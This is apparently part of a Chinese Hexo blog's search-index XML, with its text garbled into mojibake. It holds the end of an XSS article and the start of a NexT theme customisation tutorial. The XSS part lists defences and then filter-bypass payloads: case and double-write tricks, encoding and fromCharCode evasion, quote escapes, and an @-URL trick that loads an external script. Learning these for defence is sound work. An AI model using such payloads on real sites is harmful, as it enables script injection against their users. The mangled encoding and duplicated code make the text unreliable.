æ³•è¯»å–åˆ°cookieï¼Œä½†æ˜¯æµè§ˆå™¨è¿˜æ˜¯èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨cookieï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢xssçš„æ”»å‡»ã€‚ ä¸€èˆ¬çš„Cookieéƒ½æ˜¯ä»Ždocumentå¯¹è±¡ä¸­èŽ·å¾—çš„ï¼ŒçŽ°åœ¨æµè§ˆå™¨åœ¨è®¾ç½® Cookieçš„æ—¶å€™ä¸€èˆ¬éƒ½æŽ¥å—ä¸€ä¸ªå«åšHttpOnlyçš„å‚æ•°ï¼Œè·Ÿdomainç­‰å…¶ä»–å‚æ•°ä¸€æ ·ï¼Œä¸€æ—¦è¿™ä¸ªHttpOnlyè¢«è®¾ç½®ï¼Œä½ åœ¨æµè§ˆå™¨çš„ documentå¯¹è±¡ä¸­å°±çœ‹ä¸åˆ°Cookieäº†ï¼Œè€Œæµè§ˆå™¨åœ¨æµè§ˆçš„æ—¶å€™ä¸å—ä»»ä½•å½±å“ï¼Œå› ä¸ºCookieä¼šè¢«æ”¾åœ¨æµè§ˆå™¨å¤´ä¸­å‘é€å‡ºåŽ»(åŒ…æ‹¬ajaxçš„æ—¶å€™)ï¼Œåº”ç”¨ç¨‹åºä¹Ÿä¸€èˆ¬ä¸ä¼šåœ¨jsé‡Œæ“ä½œè¿™äº›æ•æ„ŸCookieçš„ï¼Œå¯¹äºŽä¸€äº›æ•æ„Ÿçš„Cookieæˆ‘ä»¬é‡‡ç”¨HttpOnlyï¼Œå¯¹äºŽä¸€äº›éœ€è¦åœ¨åº”ç”¨ç¨‹åºä¸­ç”¨jsæ“ä½œçš„cookieæˆ‘ä»¬å°±ä¸äºˆè®¾ç½®ï¼Œè¿™æ ·å°±ä¿éšœäº†Cookieä¿¡æ¯çš„å®‰å…¨ä¹Ÿä¿è¯äº†åº”ç”¨ã€‚Content Security Policyï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰ä¸¥æ ¼çš„CSPåœ¨XSSçš„é˜²èŒƒä¸­å¯ä»¥èµ·åˆ°ä»¥ä¸‹çš„ä½œç”¨ï¼šç¦æ­¢åŠ è½½å¤–åŸŸä»£ç ï¼Œé˜²æ­¢å¤æ‚çš„æ”»å‡»é€»è¾‘ã€‚ç¦æ­¢å¤–åŸŸæäº¤ï¼Œç½‘ç«™è¢«æ”»å‡»åŽï¼Œç”¨æˆ·çš„æ•°æ®ä¸ä¼šæ³„éœ²åˆ°å¤–åŸŸã€‚ç¦æ­¢å†…è”è„šæœ¬æ‰§è¡Œï¼ˆè§„åˆ™è¾ƒä¸¥æ ¼ï¼Œç›®å‰å‘çŽ° GitHub ä½¿ç”¨ï¼‰ã€‚ç¦æ­¢æœªæŽˆæƒçš„è„šæœ¬æ‰§è¡Œï¼ˆæ–°ç‰¹æ€§ï¼ŒGoogle Map ç§»åŠ¨ç‰ˆåœ¨ä½¿ç”¨ï¼‰ã€‚åˆç†ä½¿ç”¨ä¸ŠæŠ¥å¯ä»¥åŠæ—¶å‘çŽ° XSSï¼Œåˆ©äºŽå°½å¿«ä¿®å¤é—®é¢˜ã€‚è¾“å…¥å†…å®¹é•¿åº¦æŽ§åˆ¶ å¯¹äºŽä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œéƒ½åº”è¯¥é™å®šä¸€ä¸ªåˆç†çš„é•¿åº¦ã€‚è™½ç„¶æ— æ³•å®Œå…¨é˜²æ­¢xsså‘ç”Ÿï¼Œä½†å¯ä»¥å¢žåŠ xssæ”»å‡»çš„éš¾åº¦ã€‚å°ç»“ XSSæ”»å‡»é˜²å¾¡æ–¹æ³•ï¼šXSS filterï¼›çº¯å‰ç«¯æ¸²æŸ“ï¼Œæ•°æ®åˆ†ç¦»ï¼›HTMLè½¬ä¹‰ï¼›è®¾ç½®HttpOnlyå±žæ€§ï¼›è®¾ç½®CSPï¼›é™åˆ¶è¾“å…¥å†…å®¹çš„é•¿åº¦XSSç»•è¿‡çš„æŠ€å·§ æœ‰xssé˜²å¾¡ä¾¿ä¼šæœ‰xssç»•è¿‡é˜²å¾¡å§¿åŠ¿ï¼Œè¿™æ˜¯æ”»ä¸Žé˜²ä¸æ–­åšå¼ˆçš„è¡¨çŽ°ä¸Žæˆæžœã€‚å¤§å°å†™ç»•è¿‡1&lt;Script&gt;alert(1)&lt;/Script&gt;åŒå†™ç»•1&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;æ›¿æ¢ç»•è¿‡1è¿‡æ»¤ alert ç”¨promptï¼Œconfirmï¼Œtop['alert'](1)ä»£æ›¿ç»•è¿‡è¿‡æ»¤() ç”¨``ä»£æ›¿ç»•è¿‡è¿‡æ»¤ç©ºæ ¼ ç”¨%0aï¼ˆæ¢è¡Œç¬¦ï¼‰,%0dï¼ˆå›žè½¦ç¬¦ï¼‰ï¼Œ/**/ä»£æ›¿ç»•è¿‡å°å†™è½¬å¤§å†™æƒ…å†µä¸‹ å­—ç¬¦Å¿å¤§å†™åŽä¸ºSï¼ˆÅ¿ä¸ç­‰äºŽsï¼‰%00æˆªæ–­ç»•è¿‡1&lt;a href=javascr%00ipt:alert(1)&gt;xss&lt;/a&gt;ç¼–ç ç»•è¿‡123456789å®žä½“ç¼–ç javascrip&amp;#x74;:alert(1) åå…­è¿›åˆ¶javascrip&amp;#116;:alert(1) åè¿›åˆ¶unicodeç¼–ç javascrip\u0074:alert(1)urlç¼–ç javascrip%74:alert(1)fromCharCodeæ–¹æ³•ç»•è¿‡12String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))javascriptä¼ªåè®®ç»•è¿‡ æ— æ³•é—­åˆåŒå¼•å·çš„æƒ…å†µä¸‹ï¼Œå°±æ— æ³•ä½¿ç”¨onclickç­‰äº‹ä»¶ï¼Œåªèƒ½ä¼ªåè®®ç»•è¿‡ï¼Œæˆ–è€…è°ƒç”¨å¤–éƒ¨jsæ¢è¡Œç»•è¿‡æ­£åˆ™åŒ¹é…12onmousedown=alert(1)æ³¨é‡Šç¬¦12345678// å•è¡Œæ³¨é‡Š&lt;!-- --!&gt; æ³¨é‡Šå¤šè¡Œå†…å®¹&lt;!-- --&gt; æ³¨é‡Šå¤šè¡Œå†…å®¹&lt;-- --&gt; æ³¨é‡Šå¤šè¡Œå†…å®¹&lt;-- --ï¼&gt; æ³¨é‡Šå¤šè¡Œå†…å®¹--&gt; å•è¡Œæ³¨é‡ŠåŽé¢å†…å®¹/* */ å¤šè¡Œæ³¨é‡Šæœ‰æ—¶è¿˜å¯ä»¥åˆ©ç”¨æµè§ˆå™¨çš„å®¹é”™æ€§ï¼Œä¸éœ€è¦æ³¨é‡Šé—­åˆæ ‡ç­¾ç©ºæ ¼ç»•è¿‡1&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;@ç¬¦å·ç»•è¿‡urlé™åˆ¶1https://www.segmentfault.com@xss.haozi.me/j.jså…¶å®žè®¿é—®çš„æ˜¯@åŽé¢çš„å†…å®¹â€œ)é€ƒé€¸å‡½æ•°åŽæŽ¥åˆ†å·1");alert(1)//\ç»•è¿‡è½¬ä¹‰é™åˆ¶12\")alert(1) //XSSç»ƒä¹ å¹³å° ä»¥ä¸‹æ˜¯å‡ ä¸ªXSSæ”»å‡»å°æ¸¸æˆï¼Œå¼€å‘è€…åœ¨ç½‘ç«™ä¸Šæ•…æ„ç•™ä¸‹äº†ä¸€äº›å¸¸è§çš„ XSS æ¼æ´žã€‚çŽ©å®¶åœ¨ç½‘é¡µä¸Šæäº¤ç›¸åº”çš„è¾“å…¥ï¼Œå®Œæˆ XSS æ”»å‡»å³å¯é€šå…³ã€‚alert(1) to win prompt(1) to win XSS game XSS Challengeså‚è€ƒèµ„æ–™å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆä¸€ï¼‰ï¼šå¦‚ä½•é˜²æ­¢XSSæ”»å‡»ï¼Ÿæµ…è°ˆè·¨ç«™è„šæœ¬æ”»å‡»ä¸Žé˜²å¾¡é¢è¯•é—®é¢˜å¦‚ä½•é¢„é˜²xssæ”»å‡»xssæ”»å‡»åŽŸç†ä¸Žè§£å†³æ–¹æ³•XSSæ”»å‡»åŠé¢„é˜²OWASP Top 10 - 2017]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>è·¨ç«™è„šæœ¬æ”»å‡»</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å®šåˆ¶Hexo+NexTçš„ä¸ªæ€§åŒ–åšå®¢]]></title>
    <url>%2Fposts%2Fccfc6699.html%2F</url>
    <content type="text"><![CDATA[æ—¥å‡ºæ±ŸèŠ±çº¢èƒœç«ï¼Œæ˜¥æ¥æ±Ÿæ°´ç»¿å¦‚è“ å‰å‡ å¤©ï¼Œæˆ‘å†™äº†ä¸€ç¯‡å…³äºŽå¦‚ä½•ä½¿ç”¨GitHubï¼‹Hexoæ­å»ºä¸ªäººåšå®¢çš„åšæ–‡ï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä¼šä»¥æˆ‘çš„åšå®¢ä¸ºä¾‹ï¼Œè®²è®²å¦‚ä½•å¯¹NexTä¸»é¢˜çš„ä¸ªæ€§åŒ–å®šåˆ¶å’Œä¸€äº›ç»†èŠ‚çš„ä¼˜åŒ–ã€‚å‰è¨€ è¿™ç¯‡åšå®¢ä¸»è¦æ˜¯nextä¸»é¢˜çš„ä¸ªæ€§åŒ–å®šåˆ¶ï¼Œè¿˜æœ‰ä¸€äº›ç»†èŠ‚çš„ä¼˜åŒ–ã€‚åœ¨æ­å»ºçš„è¿‡ç¨‹ï¼Œæœ‰ä¸€äº›ä¼˜åŒ–ï¼Œä¹Ÿæ˜¯å‚è€ƒäº†å¤§é‡ä¹‹å‰å¤§ä½¬çš„æ•™ç¨‹å’Œç»“åˆäº†ä¸€äº›åšçš„æ¯”è¾ƒä¼˜ç§€çš„åšå®¢ï¼Œæˆ‘åœ¨è¿™é‡Œåšäº†ä¸€ä¸ªé›†åˆï¼ŒåŒæ—¶æŠŠè‡ªå·±åšçš„è€Œåˆ«äººæ²¡æœ‰åšçš„ä¼˜åŒ–ï¼Œå†™å‡ºæ¥æ–¹ä¾¿å¤§å®¶ã€‚ å‚è€ƒçš„æ–‡ç« æˆ‘éƒ½ä¼šè´´å‡ºåŽŸæ–‡é“¾æŽ¥ï¼Œä½†æ˜¯æœ‰ä¸€äº›ä¼˜åŒ–ï¼Œæ˜¯æˆ‘è‡ªå·±è¾›è‹¦æ›´æ”¹æ ·å¼æ‰åšå‡ºæ¥çš„æ•ˆæžœï¼Œæœ‰äº›ä¹Ÿæ˜¯å¿˜è®°äº†å…·ä½“çš„ä¿®æ”¹æ–¹æ³•ï¼Œä¸»è¦æ˜¯ç›´æŽ¥å®¡æŸ¥å…ƒç´ ï¼Œä¸€ç‚¹ä¸€ç‚¹çš„å®šä½åˆ°æ ·å¼è¡¨ï¼Œä¸€ç‚¹ä¸€ç‚¹çš„æµ‹è¯•ä¿®æ”¹ï¼Œç›¸ä¿¡é€šè¿‡å®¡æŸ¥å…ƒç´ ï¼Œä½ ä¹Ÿå¯ä»¥åšåˆ°ã€‚å®‰è£…NexTä¸»é¢˜ æˆ‘ä½¿ç”¨çš„æ˜¯æ¯”è¾ƒç®€çº¦çš„NexTä¸»é¢˜ï¼Œå¦‚æžœä½ å¯¹å…¶ä»–ä¸»é¢˜æ„Ÿå…´è¶£ï¼Œå¯ä»¥ç‚¹å‡»è¿™é‡Œã€‚ å®‰è£…æ–¹æ³•ï¼šæ‰“å¼€åšå®¢æ ¹ç›®å½•ä¸‹çš„themesæ–‡ä»¶å¤¹ï¼Œå³é”®Git Bashï¼Œè¿è¡Œå‘½ä»¤ï¼šgit clone https://github.com/iissnan/hexo-theme-next themes/next ä¸‹è½½å¥½ä¹‹åŽï¼ŒæŠŠhexo-theme-nextæ”¹ä¸ºnextï¼ŒæŽ¥ç€æ‰“å¼€nextç›®å½•ä¸‹çš„ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlï¼Œæ‰¾åˆ°themeå­—æ®µï¼ŒæŠŠå‚æ•°æ”¹ä¸ºtheme: nextï¼Œä¹‹åŽåœ¨æ ¹ç›®å½•ä¸‹è¿è¡Œï¼š12hexo cleanhexo s -gå…³äºŽ_config.yml é¦–å…ˆ_config.ymlï¼Œå®ƒæ˜¯ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œæœ‰ä¸¤ä¸ªï¼Œåå­—ä¸€æ ·æ¯”è¾ƒå®¹æ˜“æ··æ·†ã€‚ç«™ç‚¹é…ç½®æ–‡ä»¶ï¼Œä½äºŽç«™ç‚¹æ–‡ä»¶å¤¹çš„æ ¹ç›®å½•ä¸‹ä¾‹å¦‚æˆ‘çš„æ˜¯H:/blog/_config.ymlä¸»é¢˜é…ç½®æ–‡ä»¶ï¼Œä½äºŽä¸»é¢˜æ–‡ä»¶å¤¹çš„æ ¹ç›®å½•ä¸‹ä¾‹å¦‚æˆ‘çš„æ˜¯H:/blog/themes/next/_config.yml Nextè¿™ä¸ªä¸»é¢˜åŒ…å«4é’Ÿé£Žæ ¼ï¼Œé»˜è®¤çš„æ˜¯Museï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯Piscesã€‚ä½ ä¹Ÿå¯ä»¥å°è¯•å…¶ä»–é£Žæ ¼ï¼Œå…·ä½“æ“ä½œï¼šæ‰“å¼€H:/blog/_config.ymlï¼Œå®šä½åˆ°Schemesï¼Œæƒ³è¦å“ªæ¬¾ä¸»é¢˜å°±å–æ¶ˆå‰é¢çš„#ã€‚12345# Schemes#scheme: Muse#scheme: Mistscheme: Pisces#scheme: GeminiNextä¸»é¢˜ç¾ŽåŒ–æŽ¥ä¸‹æ¥å°±æ˜¯ä¸»é¢˜çš„ç¾ŽåŒ–å•¦æ·»åŠ Githubä¸å¸¦æˆ–è€…è§’æ ‡æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• é¦–å…ˆå…ˆç‚¹å‡»è¿™é‡Œæˆ–è€…è¿™é‡ŒæŒ‘é€‰è‡ªå·±å–œæ¬¢çš„æ ·å¼ï¼Œå¹¶å¤åˆ¶ä»£ç ã€‚ æ‰“å¼€themes/next/layout/_layout.swigæ–‡ä»¶ï¼Œåœ¨&lt;header&gt;&lt;/header&gt;ä¹‹å‰æ·»åŠ ä»£ç ï¼Œå¹¶æŠŠhrefæ”¹ä¸ºä½ çš„åšå®¢åœ°å€æ·»åŠ RSSè®¢é˜…æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• é¦–å…ˆåœ¨åšå®¢çš„æ ¹ç›®å½•H:/blogï¼Œå®‰è£…Hexoæ’ä»¶ï¼Œæ’ä»¶ä¼šæ”¾åœ¨node_modulesè¿™ä¸ªæ–‡ä»¶å¤¹ã€‚1npm install --save hexo-generator-feed æŽ¥ä¸‹æ¥æ‰“å¼€H:/blog/_config.ymlæ–‡ä»¶ï¼Œåœ¨æœ«å°¾æ·»åŠ 1234# Extensions## Plugins: http://hexo.io/plugins/# RSSè®¢é˜…plugin: hexo-generator-feed ç„¶åŽæ‰“å¼€H:/blog/themes/next/_config.ymlæ–‡ä»¶,æ‰¾åˆ°rssï¼Œæ·»åŠ å‚æ•°123# hexo-generator-feed required for rss support. Leave rss as blank to use site's feed link.# Set rss to false to disable feed link. Set rss to specific value if you have burned your feed already.rss: /atom.xmlæ·»åŠ åŠ¨æ€èƒŒæ™¯æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€H:/blog/_config.ymlæ–‡ä»¶ï¼Œæ‰¾åˆ°canvas_nest,æŠŠfalseæ”¹ä¸ºtrue1234567canvas_nest: enable: true onmobile: true # display on mobile or not color: "0,0,255" # çº¿æ¡é¢œè‰²ï¼Œä¸‰ä¸ªæ•°å­—åˆ†åˆ«ä¸º(R,G,B) opacity: 0.5 # çº¿æ¡é€æ˜Žåº¦ï¼ˆ0~1ï¼‰ zIndex: -1 # èƒŒæ™¯çš„z-indexå±žæ€§ count: 99 # çº¿æ¡çš„æ€»æ•°é‡é¼ æ ‡ç‚¹å‡»ç‰¹æ•ˆæ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€H:/blog/themes/next/source/js/srcï¼Œæ–°å»ºä¸€ä¸ªfirework.jsæ–‡ä»¶ï¼ŒåŠ å…¥ä»¥ä¸‹ä»£ç ï¼š1"use strict";function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color="#F00",a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:"easeOutExpo",update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:"linear",duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:"easeOutExpo",update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(".fireworks");if(canvasEl)&#123;var ctx=canvasEl.getContext("2d"),numberOfParticules=30,pointerX=0,pointerY=0,tap="mousedown",colors=["#FF1461","#18FF92","#5A87FF","#FBF38C"],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+"px",canvasEl.style.height=window.innerHeight+"px",canvasEl.getContext("2d").scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;"sidebar"!==e.target.id&amp;&amp;"toggle-sidebar"!==e.target.id&amp;&amp;"A"!==e.target.nodeName&amp;&amp;"IMG"!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener("resize",setCanvasSize,!1)&#125;"use strict";function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color="#F00",a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:"easeOutExpo",update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:"linear",duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:"easeOutExpo",update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(".fireworks");if(canvasEl)&#123;var ctx=canvasEl.getContext("2d"),numberOfParticules=30,pointerX=0,pointerY=0,tap="mousedown",colors=["#FF1461","#18FF92","#5A87FF","#FBF38C"],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+"px",canvasEl.style.height=window.innerHeight+"px",canvasEl.getContext("2d").scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;"sidebar"!==e.target.id&amp;&amp;"toggle-sidebar"!==e.target.id&amp;&amp;"A"!==e.target.nodeName&amp;&amp;"IMG"!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener("resize",setCanvasSize,!1)&#125;; ç„¶åŽåœ¨H:/blog/themes/next/layout/_layout.swigæ–‡ä»¶ä¸­ï¼Œ&lt;/head&gt;ä¹‹å‰åŠ å…¥ä»¥ä¸‹ä»£ç ï¼š1234&lt;!-- çˆ†ç‚¸çº¢å¿ƒæ•ˆæžœ --&gt;&lt;canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" &gt;&lt;/canvas&gt; &lt;script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="/js/src/yanhuatexiao.js"&gt;&lt;/script&gt; è¿˜å¯ä»¥æ¢æˆç‚¹å‡»å‡ºçŽ°çˆ±å¿ƒçš„ç‰¹æ•ˆ,æ–¹æ³•æ˜¯ä¸€æ ·çš„ã€‚1!function(e,t,a)&#123;function n()&#123;c(".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 500%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText="left:"+d[e].x+"px;top:"+d[e].y+"px;opacity:"+d[e].alpha+";transform:scale("+d[e].scale+","+d[e].scale+") rotate(45deg);background:"+d[e].color+";z-index:99999");requestAnimationFrame(r)&#125;function o()&#123;var t="function"==typeof e.onclick&amp;&amp;e.onclick;e.Î¿nclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement("div");a.className="heart",d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement("style");a.type="text/css";try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName("head")[0].appendChild(a)&#125;function s()&#123;return"rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);ä¿®æ”¹è¶…é“¾æŽ¥çš„é¢œè‰²æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€H:\blog\themes\next\source\css\_common\components\postæ–‡ä»¶å¤¹ä¸‹çš„post.styl,æ·»åŠ ä»¥ä¸‹cssæ ·å¼ï¼š12345678.post-body p a &#123; color: #0593d3; border-bottom: none; &amp;:hover &#123; color: #fc6423; text-decoration: underline; &#125;&#125; å…¶ä¸­é€‰æ‹©.post-body æ˜¯ä¸ºäº†ä¸å½±å“æ ‡é¢˜ï¼Œé€‰æ‹© p æ˜¯ä¸ºäº†ä¸å½±å“é¦–é¡µâ€œé˜…è¯»å…¨æ–‡â€çš„æ˜¾ç¤ºæ ·å¼,é¢œè‰²å¯ä»¥è‡ªå·±å®šä¹‰ã€‚æ–‡ç« ç»“å°¾æ·»åŠ ç»“æŸæ ‡è®°æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€H:/blog/themes/next/layout/_macroæ–‡ä»¶å¤¹ï¼Œæ–°å»ºpassage-end-tag.swig æ–‡ä»¶,å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------æœ¬æ–‡ç»“æŸ&lt;i class="fa fa-paw"&gt;&lt;/i&gt;æ„Ÿè°¢æ‚¨çš„é˜…è¯»-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; ç„¶åŽæ‰“å¼€H:/blog/themes/next/layout/_macro/post.swigæ–‡ä»¶ï¼Œåœ¨post-body ä¹‹åŽï¼Œ post-footer ä¹‹å‰æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; æŽ¥ç€åœ¨H:/blog/themes/next/_config.ymlæœ«å°¾æ·»åŠ ï¼š123# æ–‡ç« æœ«å°¾æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°passage_end_tag: enabled: trueä¿®æ”¹æ–‡ç« åº•éƒ¨å¸¦#å·çš„æ ‡ç­¾æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• ä¿®æ”¹H:/blog/themes/next/layout/_macro/post.swigï¼Œæœç´¢ rel=&quot;tag&quot;&gt;#ï¼Œå°† # æ¢æˆ&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;è®¾ç½®åšå®¢å¤´åƒå¹¶æ—‹è½¬æ•ˆæžœå›¾å®žçŽ°æ–¹æ³• æ‰“å¼€H:/blog/themes/next/source/images,æŠŠå¤´åƒæ”¾åˆ°è¯¥ç›®å½•ä¸‹ï¼Œç„¶åŽæ‰“å¼€H:/blog/_config.yml,æ‰¾åˆ°avatar:ï¼Œä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š1234567891011avatar: # In theme directory (source/images): /images/avatar.gif # In site directory (source/uploads): /uploads/avatar.gif # You can also use other linking images. url: /images/avatar.gif # If true, the avatar would be dispalyed in circle. rounded: true # The value of opacity should be choose from 0 to 1 to set the opacity of the avatar. opacity: 1 # If true, the avatar would be rotated with the cursor. rotated: trueå¿«é€Ÿå®žçŽ°åšå®¢åŽ‹ç¼© é¡¹ç›®åŽ‹ç¼©ä¹Ÿå«ä»£ç ä¸‘åŒ–, åˆ†åˆ«å¯¹ htmlã€cssã€jsã€imagesè¿›è¡Œä¼˜åŒ–ï¼Œå³æŠŠé‡å¤çš„ä»£ç åˆå¹¶ï¼ŒæŠŠå¤šä½™çš„ç©ºæ ¼åŽ»æŽ‰ï¼Œç”¨ç®—æ³•æŠŠ images è¿›è¡ŒåŽ‹ç¼©ã€‚åŽ‹ç¼©åŽçš„åšå®¢ï¼ŒåŠ è½½é€Ÿåº¦ä¼šæœ‰è¾ƒå¤§çš„æå‡ï¼Œè‡ªç„¶èƒ½ç•™ä½æ›´å¤šæ¸¸å®¢ã€‚ 